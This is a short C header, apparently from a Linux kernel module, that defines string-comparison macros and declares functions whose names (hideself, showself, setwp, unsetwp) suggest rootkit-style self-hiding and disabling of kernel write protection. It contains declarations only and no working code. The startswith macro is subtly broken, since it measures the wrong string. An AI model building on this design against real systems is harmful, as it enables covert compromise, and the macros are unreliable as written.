#include <linux/fs.h>
#include <asm/segment.h>
#include <asm/uaccess.h>
#include "../../inc/config.h"

#define true 1
#define false 0
#define bool int

#define contains(str, sub) strstr(str, sub) != NULL
#define ncontains(str, sub) strstr(str, sub) == NULL
#define startswith(str, sub) strncmp(str, sub, strlen(str))==0
#define neq(s1, s2) strcmp(s1, s2)!=0
#define eq(s1, s2) strcmp(s1, s2)==0

void showself(void);
void hideself(void);
void setwp(void);
void unsetwp(void);
bool exists(char*);
bool remove_sub(char*, char*);
void print(char*, ...);
